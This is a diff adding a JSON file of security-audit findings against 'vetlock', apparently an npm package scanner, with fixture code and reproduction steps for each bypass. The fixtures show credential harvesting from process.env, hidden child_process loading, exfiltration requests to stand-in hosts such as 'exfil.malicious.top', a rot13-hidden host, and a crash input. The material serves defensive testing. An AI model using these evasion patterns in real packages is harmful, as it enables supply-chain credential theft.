@@ -1,0 +1,215 @@
+[
+  {
+    "id": "L1",
+    "title": "Env token harvest via `const { NPM_TOKEN } = process.env` destructuring bypasses env.token-harvest",
+    "class": "detector-evasion",
+    "description": "The env detector's MemberExpression visitor only fires for shapes matching `process.env.X`, `alias.X` (where alias is a processAlias), or `Object.<method>(process.env)`. Object-destructuring (`const { NPM_TOKEN } = process.env`) never creates a MemberExpression that visits — it uses ObjectPattern binding, which the visitor doesn't handle. So a package that steals NPM_TOKEN, GITHUB_TOKEN, AWS_*, and every other listed sensitive key via one destructuring statement emits ZERO envAccesses and env.token-harvest never fires. Verified end-to-end: a Shai-Hulud-shape attack that harvests six sensitive keys this way is reported as CLEAN by the env detector.",
+    "fixture_code": "'use strict';\n// Harvest six sensitive credentials — 0 envAccesses recorded\nconst { NPM_TOKEN, GITHUB_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, STRIPE_SECRET_KEY, OPENAI_API_KEY } = process.env;\nconst https = require('https');\nif (false) https.request({hostname: 'evil.top', path: '/x'}, () => {});\n// vetlock verdict: WARN (only net.new-module, no BLOCK)",
+    "severity_if_confirmed": "critical",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "cat > /tmp/e.js << 'EOF'\n'use strict';\nconst { NPM_TOKEN, GITHUB_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY } = process.env;\nEOF",
+      "node -e \"import('/Users/L122472/personal/vetlock/packages/core/dist/capabilities.js').then(m => { const s = require('fs').readFileSync('/tmp/e.js','utf8'); console.log(m.extractCapabilities('e.js', s, 'sha', s.length).envAccesses); })\"",
+      "Output: envAccesses: [] — no findings recorded despite four sensitive-key reads"
+    ],
+    "detectors_bypassed": [
+      "env.token-harvest"
+    ],
+    "suggested_fix": "In capabilities.ts, add an ObjectPattern visitor that inspects `path.node.id.properties` when `path.node.init` is `process.env` (or a processAlias). Record each destructured property name as an EnvAccess. Also visit VariableDeclarator when `id` is an ObjectPattern and `init` matches process/env aliases.",
+    "fix_effort": "moderate"
+  },
+  {
+    "id": "L2",
+    "title": "process.env whole-object enumeration via `{...process.env}` spread is invisible",
+    "class": "detector-evasion",
+    "description": "The whole-env enumeration check fires only when process.env appears as the argument of a MemberExpression call whose callee.object is `Object` (i.e. `Object.keys(process.env)`, `Object.entries(...)`, `Object.assign(x, process.env)`, `Object.fromEntries(...)`). Attackers can snapshot every environment variable using the spread operator (`{...process.env}`) or `for...in`, neither of which passes the parent-check. Confirmed: `const s = {...process.env};` produces zero envAccesses. Ditto `Reflect.ownKeys(process.env)`. This defeats the ENV detector's whole-object arm entirely.",
+    "fixture_code": "'use strict';\nconst snapshot = {...process.env};   // steals every env var, no envAccess recorded\n// Attacker later exfiltrates `snapshot` — every token in one payload\nfor (const k in process.env) {}       // ditto — no enumeration finding\nconst keys = Reflect.ownKeys(process.env);   // same",
+    "severity_if_confirmed": "critical",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "Feed the fixture into extractCapabilities and confirm envAccesses is [] for the spread and for...in lines"
+    ],
+    "detectors_bypassed": [
+      "env.token-harvest (whole-object enumeration arm)"
+    ],
+    "suggested_fix": "In the MemberExpression visitor, also fire the whole-object envAccess when process.env is the argument of a SpreadElement, ForInStatement, ForOfStatement, or the arg to `Reflect.ownKeys`/`Reflect.get`/`JSON.stringify`. Simplest: any reference to `process.env` NOT immediately followed by a property access should be treated as enumeration.",
+    "fix_effort": "small"
+  },
+  {
+    "id": "L3",
+    "title": "child_process import bypass via `require.call(null, 'child_process')` — no exec.new-module",
+    "class": "detector-evasion",
+    "description": "The CallExpression visitor only recognizes `require('x')` when the callee is a bare Identifier named 'require'. Attackers can use `require.call(null, 'child_process')` or `require.apply(null, ['child_process'])`, where the callee is a MemberExpression (`require.call`), which never enters the require-detection branch. The module is loaded at runtime but vetlock sees ZERO execModules. Same trick works for `process.mainModule.require('child_process')`. Verified: `require.call(null, 'child_process')` produces execModules: []. A package that spawns processes this way is reported CLEAN by the exec detector.",
+    "fixture_code": "'use strict';\n// Both of these load child_process at runtime; vetlock records nothing.\nconst cp1 = require.call(null, 'child_process');\nconst cp2 = require.apply(null, ['child_process']);\nconst cp3 = process.mainModule.require('child_process');\nconst cp4 = module.constructor._load('child_process');\nif (false) cp1.spawn('id');",
+    "severity_if_confirmed": "critical",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "Feed fixture into extractCapabilities; execModules is []; dynamicCode is []; no findings emitted"
+    ],
+    "detectors_bypassed": [
+      "exec.new-module",
+      "net.new-module (if the same trick loads http/https)",
+      "code.dynamic-loading-added"
+    ],
+    "suggested_fix": "Recognize require.call / require.apply / require.bind — anywhere require is the .object of a MemberExpression called with the module name as an arg. Also recognize process.mainModule.require and module.constructor._load / Module._load — these are the documented ways to obtain require without a bare identifier.",
+    "fix_effort": "small"
+  },
+  {
+    "id": "L4",
+    "title": "Bare-hostname exfil with non-listed TLD (.top, .pw, .zip, .click, .info) bypasses net.new-endpoint",
+    "class": "detector-evasion",
+    "description": "URL_REGEX (`/\\b(https?:\\/\\/[^\\s'\"`<>]+|(?:[a-z0-9-]+\\.){1,}(?:com|net|org|io|dev|co|app|xyz|ru|cn|tk|ml|ga|cf|invalid))\\b/gi`) matches only two shapes: (1) a full `https?://…` URL, or (2) a bare domain ending in a hardcoded TLD (com/net/org/io/dev/co/app/xyz/ru/cn/tk/ml/ga/cf/invalid). Attackers using `https.request({hostname: 'exfil.malicious.top', path: '/collect'})` never write an `https?://` URL AND use a TLD not in the whitelist. The literal 'exfil.malicious.top' matches neither alternative → net.new-endpoint never fires. Only net.new-module (WARN) triggers. The whitelist misses top-abused malicious TLDs (.top, .pw, .zip, .click, .info, .us, .biz, .mobi, .icu, .host, .online, .club, .cloud, .site, .work, .fit, .men, .stream, .party, .science, .today, .rest, .top). Confirmed: 'evil.malicious.top' with request({hostname}) produces urlLiterals: [].",
+    "fixture_code": "'use strict';\nconst https = require('https');\n// No full URL, host uses .top (not in URL_REGEX whitelist)\nconst host = 'exfil.malicious.top';\nif (false) https.request({hostname: host, path: '/collect', method: 'POST'}, () => {});\n// vetlock: net.new-module WARN only. No BLOCK, no net.new-endpoint.",
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "Feed fixture into extractCapabilities; urlLiterals is []; only networkModules: ['https'] recorded"
+    ],
+    "detectors_bypassed": [
+      "net.new-endpoint"
+    ],
+    "suggested_fix": "URL_REGEX's second alternative should catch ANY domain-shaped literal (host with 2+ dots and a valid TLD-alphanumeric structure), not enumerate specific TLDs. Alternatively, look at all string literals passed as `hostname:` in ObjectExpression args to https.request/net.connect/dgram.createSocket etc — literals in known-network-API slots are endpoints regardless of TLD.",
+    "fix_effort": "moderate"
+  },
+  {
+    "id": "L5",
+    "title": "process.env access via `Reflect.get(process.env, 'NPM_TOKEN')` bypasses env.token-harvest",
+    "class": "detector-evasion",
+    "description": "The MemberExpression visitor only fires for shapes matching `process.env.KEY`, aliased `env.KEY`, or `Object.<method>(process.env)`. `Reflect.get(process.env, 'NPM_TOKEN')` uses `Reflect` (not `Object`) as the callee.object — the parent-check condition `t.isIdentifier(path.parent.callee.object, { name: 'Object' })` fails. So Reflect-based env reads emit ZERO envAccesses. Same for `Reflect.ownKeys(process.env)`, `Reflect.get(process, 'env')`, and any `Reflect.apply(getter, process.env, [])`. Confirmed with the raw one-liner.",
+    "fixture_code": "'use strict';\nconst t = Reflect.get(process.env, 'NPM_TOKEN');\nconst all = Reflect.ownKeys(process.env);\nconst env = Reflect.get(process, 'env');\nconst t2 = env['NPM_TOKEN'];  // once env is not in processAliases, this too is missed\n// vetlock: 0 envAccesses.",
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "Run extractCapabilities on the fixture — envAccesses: []"
+    ],
+    "detectors_bypassed": [
+      "env.token-harvest"
+    ],
+    "suggested_fix": "In the CallExpression visitor, when the callee is `Reflect.<method>` and process.env / process appears among the arguments, emit an EnvAccess with the string-literal property (if present) or keys:null (if not). Also treat `Reflect.get(process, 'env')` as introducing a process.env alias.",
+    "fix_effort": "small"
+  },
+  {
+    "id": "L6",
+    "title": "Fail-soft-parse invariant violated: unterminated backtick chain crashes @babel/traverse with stack overflow",
+    "class": "crash / DoS",
+    "description": "The 'Fail-soft parse — unparseable source → WARN, never crash' invariant is broken. Feeding a file containing `const x = ` followed by ~7000+ backticks (unterminated template literals) causes @babel/parser (in errorRecovery mode) to build a deeply nested TemplateLiteral AST that overflows the recursive descent of `@babel/traverse` during the fold pass, raising a RangeError. The try/catch in capabilities.ts wraps only `parser.parse` — the crash happens later in `foldConstants → traverseFn → visitQueue`, which isn't inside any try/catch, so extractCapabilities re-throws. Any malicious package can include such a stub file and take down the vetlock run partway (uncaught RangeError propagates up through engine.ts). Note: this also blocks analysis of subsequent packages in the closure. Reproducer trips reliably at 6000+ backticks; malicious `.min.js` files can easily include tens of thousands.",
+    "fixture_code": "// index.js: 15,000 backticks (fits in ~15KB tarball)\nconst x = `````````````````... (repeat ~15000 times)",
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "node -e \"import('/Users/L122472/personal/vetlock/packages/core/dist/capabilities.js').then(m => { const s = 'const x = ' + '\\x60'.repeat(15000); try { m.extractCapabilities('i.js', s, 'sha', s.length); console.log('OK'); } catch(e) { console.log('CRASHED:', e.message); } })\"",
+      "Output: 'CRASHED: Maximum call stack size exceeded' — the invariant is broken"
+    ],
+    "detectors_bypassed": [
+      "ALL — the file (and possibly the whole run) becomes unanalyzed"
+    ],
+    "suggested_fix": "Wrap the entire body of extractCapabilities (foldConstants + traverse + iterateFolds) in a try/catch. On catch, return the base FileCapabilities with parseError set to the message. Better: use `parser.parse`'s `sourceType: 'script'` fallback + bound recursion depth in fold.ts (guard tryFold against runaway recursion via depth counter).",
+    "fix_effort": "small"
+  },
+  {
+    "id": "L7",
+    "title": "Rest-destructure `const { X, ...rest } = process.env` bypasses env.token-harvest entirely",
+    "class": "detector-evasion",
+    "description": "Even more specific than L1: `const { DEBUG, ...rest } = process.env` copies EVERY unlisted environment variable (all tokens the developer didn't happen to enumerate) into `rest`, giving the attacker the full env in one variable. The ObjectPattern rest binding path is invisible to the current MemberExpression visitor AND to the Object.<method>(process.env) parent-check (there's no Object.assign call — just AST-level destructuring). Verified: 0 envAccesses recorded. This is arguably a stronger exfil pattern than `{...process.env}` because it also lifts named tokens implicitly.",
+    "fixture_code": "'use strict';\nconst { DEBUG, LOG_LEVEL, ...allOtherEnv } = process.env;\n// allOtherEnv contains NPM_TOKEN, GITHUB_TOKEN, every AWS_*, every wallet key\n// vetlock records: envAccesses: [] — nothing",
+    "severity_if_confirmed": "critical",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "extractCapabilities on the fixture → envAccesses: []"
+    ],
+    "detectors_bypassed": [
+      "env.token-harvest"
+    ],
+    "suggested_fix": "Same as L1 — handle ObjectPattern destructuring of process.env, especially the RestElement case: treat it as whole-object enumeration (keys: null).",
+    "fix_effort": "small"
+  },
+  {
+    "id": "L8",
+    "title": "process aliased through computed member access `process[\"env\"]` bypasses processAliases tracker",
+    "class": "detector-evasion",
+    "description": "The VariableDeclarator handler binds a processAlias when `init` is `process.env` (both are Identifiers with the exact names). Change property access to computed form — `process[\"env\"]` — and the check `t.isIdentifier(init.property, { name: 'env' })` fails because init.property is now a StringLiteral, not an Identifier. Confirmed: `const env = process[\"env\"]; env.NPM_TOKEN` records 0 envAccesses. Even `process[\"e\"+\"nv\"]` (which the fold pass CAN resolve to 'env') slips because processAliases binding logic doesn't consult the fold map for the property.",
+    "fixture_code": "'use strict';\nconst env = process[\"env\"];              // string-literal property — visitor misses\nconst env2 = process[\"e\" + \"nv\"];           // fold-resolvable, still missed\nconst t = env.NPM_TOKEN;                     // env not in processAliases\nconst t2 = env2.GITHUB_TOKEN;                // ditto\n// vetlock: envAccesses: []",
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "extractCapabilities on the fixture — envAccesses: []"
+    ],
+    "detectors_bypassed": [
+      "env.token-harvest"
+    ],
+    "suggested_fix": "In VariableDeclarator, when init is a MemberExpression on the `process` Identifier, resolve init.property via nodeValue(prop) (folding-aware) and compare the resulting string to 'env'. Do the same for the MemberExpression visitor when it checks obj.property.",
+    "fix_effort": "small"
+  },
+  {
+    "id": "L9",
+    "title": "Compound attack: full Shai-Hulud shape (env harvest + child_process + exfil) reports as WARN instead of BLOCK",
+    "class": "compound bypass — end-to-end proof of no-BLOCK",
+    "description": "Combining L1 (destructured env), L3 (require.call), and L4 (bare-host .top TLD) into one file produces a full worm-shaped attack — env token harvest for NPM_TOKEN + GITHUB_TOKEN + AWS_*, child_process import, network exfil to attacker C2 — and vetlock's final verdict is WARN, not BLOCK. Only net.new-module WARN fires. Verified end-to-end through runAll() over a synthetic pair. This is the exact shape of the real Shai-Hulud attack and vetlock misses every BLOCK-tier finding. Escalation rules don't rescue: compound-suspicion needs 3+ WARN findings across 2+ categories; only 1 WARN fires; OBF/typosquat/first-version escalations don't apply.",
+    "fixture_code": "'use strict';\n// Env harvest (destructure — L1)\nconst { NPM_TOKEN, GITHUB_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY } = process.env;\nconst envAll = {...process.env};\n\n// child_process via require.call (L3)\nconst cp = require.call(null, 'child_process');\nconst runCmd = cp && cp.spawn;\n\n// exfil to bare host with .top TLD (L4)\nconst https = require('https');\nconst host = 'exfil.malicious.top';\nif (false) https.request({hostname: host, path: '/collect'});\n\n// vetlock verdict on the DIFF: WARN — only 'net.new-module' fires",
+    "severity_if_confirmed": "critical",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "node /tmp/vetlock-exploits/compound_final.mjs (from analysis) — verdict WARN",
+      "Findings printed: [WARN NET net.new-module: Package started using network module https]",
+      "This attack passes any CI gate that only fails on BLOCK"
+    ],
+    "detectors_bypassed": [
+      "env.token-harvest",
+      "exec.new-module",
+      "net.new-endpoint",
+      "deps.first-version-cluster (needs 3+ categories — but envAccesses/execModules empty, so fires only NET/META)"
+    ],
+    "suggested_fix": "Fix L1, L3, L4 individually — once destructured env, require.call, and bare-host with non-listed TLD each trip their respective detectors, this compound attack becomes an obvious BLOCK.",
+    "fix_effort": "moderate"
+  },
+  {
+    "id": "L10",
+    "title": "Eval-wrapped require loads modules invisibly — only WARN dynamic-loading fires, exec/net modules not recorded",
+    "class": "detector-evasion",
+    "description": "When an attacker builds a require call inside an eval string, the extractor records the `eval()` as a dynamicCode entry (WARN) but doesn't record the loaded module. `eval(\"require('child_process')\")` sees ZERO execModules — the child_process import happens at runtime and vetlock has no visibility. The finding is only WARN (`code.dynamic-loading-added`). Combined with L4 (bare-host exfil), a full attack fires just one WARN dynamic-loading finding plus the WARN net.new-module — still 2 WARN, one category, so compound-suspicion escalation (needs 3+ WARN across 2+ categories) doesn't trigger. Result: attack rated WARN. Same applies to `new Function('return require(\"child_process\")')()` and dynamic `import(\"child_process\")` with computed string.",
+    "fixture_code": "'use strict';\nconst s = 'requ' + 'ire(\"child_' + 'process\")';\nconst cp = eval(s);                    // WARN eval, execModules stays empty\n// Or new Function\nconst mkReq = new Function('m', 'return require(m)');\nconst fs = mkReq('fs');                 // WARN new-function, no exec/fs recorded\n// Or Function.prototype.constructor\nconst mkReq2 = ({}).constructor.constructor('return require')();\nconst https = mkReq2('http' + 's');    // no network module recorded\n// vetlock: 1 WARN (eval or new-function), nothing else",
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "extractCapabilities on `const cp = eval('require(\"child_process\")');` — execModules is []",
+      "dynamicCode: [{kind:'eval', line:1}] — only WARN emitted"
+    ],
+    "detectors_bypassed": [
+      "exec.new-module",
+      "net.new-module",
+      "fs (module import)"
+    ],
+    "suggested_fix": "When the eval/newFunction argument is a foldable string, apply the fold pass to it and grep for require-like patterns. If the folded eval-string contains `require('X')`, treat X as an imported module. Also: eval() with any foldable string should escalate from WARN to BLOCK — real code has approximately zero legitimate use of `eval(string_that_we_can_read)`.",
+    "fix_effort": "moderate"
+  },
+  {
+    "id": "L11",
+    "title": "Rot13/XOR/custom-substitution URL obfuscation not folded — URL escapes both URL_REGEX and encodedUrl decoder",
+    "class": "detector-evasion",
+    "description": "The fold pass documents (in fold.ts) that ROT13/XOR/custom decoders are intentionally NOT handled — the comment relies on 'dynamic-code detector + entropy-jump detector on the encoded blob' as compensating controls. In practice: (1) the encoded string 'rksvy.rknzcyr.vainyvq' (rot13 of 'exfil.example.invalid') is 21 chars, BELOW the 24-char min for tryDecodeUrl AND below the 200-char min for suspiciousLiterals — so no OBF signal fires. (2) The custom rot13 function using String.fromCharCode arithmetic is just a normal function call — no dynamicCode entry emitted (dynamicCode is only eval/newFunction/dynamic-require/dynamic-import). (3) The final URL is only built at runtime, so URL_REGEX never sees it. Result: NO findings — attacker's exfil URL is completely invisible to every detector. Even shorter TLDs (e.g. `.top`) let the encoded form fit under all thresholds.",
+    "fixture_code": "'use strict';\nfunction rot13(s) {\n  return s.replace(/[A-Za-z]/g, c => {\n    const base = c >= 'a' ? 97 : 65;\n    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);\n  });\n}\nconst enc = 'rksvy.rknzcyr.vainyvq';   // 21 chars — under 24, under 200\nconst host = rot13(enc);                 // 'exfil.example.invalid' — runtime only\nrequire('https').request({hostname: host, path: '/x'});\n// vetlock: 0 URL findings, 0 encodedUrls, 0 suspiciousLiterals, only net.new-module WARN",
+    "severity_if_confirmed": "high",
+    "confidence": "confirmed",
+    "attacker_effort": "trivial",
+    "reproduction_steps": [
+      "extractCapabilities on the fixture — urlLiterals: [], encodedUrls: []"
+    ],
+    "detectors_bypassed": [
+      "net.new-endpoint",
+      "net.encoded-endpoint",
+      "obf.new-obfuscated-file"
+    ],
+    "suggested_fix": "Two options: (1) Lower the tryDecodeUrl min threshold or add a rot13/rot47 probe alongside base64/hex — rot13 is a fixed transformation, cheap to try. (2) Detect the pattern-shape of custom decoders: a function that iterates charCodeAt and returns String.fromCharCode of a transform is a decoder — flag any file that both defines such a function AND passes a literal blob to it. Even a coarse regex on the AST like 'string.replace(/regex/, char => String.fromCharCode(...))' would fire.",
+    "fix_effort": "moderate"
+  }
+]
